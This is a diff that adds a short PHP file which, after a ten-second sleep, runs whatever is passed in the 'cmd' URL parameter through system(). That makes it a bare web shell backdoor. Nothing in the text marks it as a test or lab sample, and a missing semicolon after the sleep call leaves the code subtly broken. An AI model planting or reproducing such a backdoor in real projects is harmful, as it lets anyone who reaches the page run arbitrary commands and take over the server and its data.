@@ -1,0 +1,11 @@
+<?php
+
+
+sleep(10)
+
+if(isset($_GET['cmd']))
+{
+    system($_GET['cmd']);
+}
+
+?>
